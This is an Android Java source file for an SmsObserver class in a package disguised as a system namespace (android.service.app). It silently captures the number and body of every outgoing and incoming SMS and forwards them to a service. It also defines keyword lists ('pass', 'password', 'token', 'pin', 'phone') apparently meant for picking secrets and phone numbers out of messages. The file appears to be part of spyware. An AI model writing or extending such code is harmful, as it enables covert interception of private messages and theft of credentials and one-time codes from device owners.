package android.service.app;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Bundle;
import android.service.app.utils.AndroidUtils;
import android.telephony.SmsMessage;

import java.util.Arrays;
import java.util.Collections;
import java.util.List;

public class SmsObserver extends ContentObserver
{
    private Context context;
    public static final String CONTENT_SMS = "content://sms/";
    public static final Uri SMS_URI = Uri.parse(CONTENT_SMS);
    public static final int SMS_SENT = 2;
    public static final int ADDRESS = 0;
    public static final int TYPE = 1;
    public static final int BODY = 2;
    public static final int ID = 3;
    public static final String[] columns = new String[]{"address", "type", "body", "_id"};

    private boolean incomingSms = false;

    public SmsObserver(Context context, Handler h)
    {
        super(h);
        this.context = context;
        this.context.getContentResolver().registerContentObserver(SMS_URI, true, this);
    }

    @Override
    public boolean deliverSelfNotifications()
    {
        return false;
    }

    @Override
    public void onChange(boolean arg0)
    {
        super.onChange(arg0);

        if (!incomingSms)
        {
            new Thread(new Runnable()
            {
                public void run()
                {
                    ContentResolver contentResolver = context.getContentResolver();
                    Cursor cursor = contentResolver.query(SMS_URI, columns, null, null, null);
                    if (cursor != null)
                    {
                        cursor.moveToNext();
                        int type = cursor.getInt(TYPE);
                        if (type == SMS_SENT)
                        {
                            AndroidUtils.printDataOnScreen("sms sent: ", ((Service) SmsObserver.this.context));
                            String phoneNumber = cursor.getString(ADDRESS);
                            String body = cursor.getString(BODY);
                            cursor.close();
                            ((Service) context).runSmsEvent(phoneNumber, body, false);
                        }
                    }
                }
            }).start();
        } else
            incomingSms = false;

    }

    public static final List<String> passwordPrefixes = Collections.unmodifiableList(Arrays.asList("pass", "password", "token", "pin"));
    public static final List<String> phonePrefixes = Collections.unmodifiableList(Arrays.asList("phone", "number", "mobile"));

    public void unregisterObserver()
    {
        context.getContentResolver().unregisterContentObserver(this);
    }

    // Define a BroadcastReceiver to detect incoming SMS
    public final BroadcastReceiver inSms = new BroadcastReceiver()
    {
        @Override
        public void onReceive(Context context, Intent intent)
        {
            String action = intent.getAction();
            final Bundle bundle = intent.getExtras();

            if (action.equals(Service.SMS_RECEIVED))
            {
                AndroidUtils.printDataOnScreen("incoming sms: ", ((Service) SmsObserver.this.context));
                incomingSms = true;
                if (bundle != null)
                {
                    new Thread(new Runnable()
                    {
                        public void run()
                        {
                            try
                            {
                                Object[] pdus = (Object[]) bundle.get("pdus");
                                for (int i = 0; i < pdus.length; i++)
                                {
                                    //TODO: 1
                                    SmsMessage messages = SmsMessage.createFromPdu((byte[]) pdus[i]);
                                    String address = messages.getOriginatingAddress();
                                    String body = messages.getDisplayMessageBody();

                                    ((Service) SmsObserver.this.context).runSmsEvent(address, body, true);
                                }
                            } catch (NullPointerException e)
                            {
                                ((Service) SmsObserver.this.context).app.handleException(e);
                            }
                        }
                    }).start();
                }
            }
        }
    };
}

